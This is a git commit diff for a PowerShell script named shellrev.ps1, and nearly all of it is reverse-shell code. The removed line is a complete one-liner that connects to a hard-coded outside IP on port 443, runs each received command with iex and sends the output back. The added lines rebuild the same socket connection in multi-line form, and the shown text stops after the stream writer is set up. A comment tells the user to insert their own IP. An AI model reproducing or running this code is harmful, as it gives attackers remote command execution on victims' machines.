31224d1d08c1cc08e7177a740b71a17293106d62
brito <57415003+br1t0ms@users.noreply.github.com>
2022-06-05 15:40:55 -0300

    Update shellrev.ps1

--- shellrev.ps1
+++ shellrev.ps1
@@ -1,6 +1,6 @@
 # Original source: https://gist.github.com/staaldraad/a4e7095db8a84061c0ec
 # Change this line and put your IP
-$socket = new-object System.Net.Sockets.TcpClient('44.197.61.137', 443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+$socket = new-object System.Net.Sockets.TcpClient('44.197.61.137', 443);
 if($socket -eq $null){exit 1}
 $stream = $socket.GetStream();
 $writer = new-object System.IO.StreamWriter($stream);
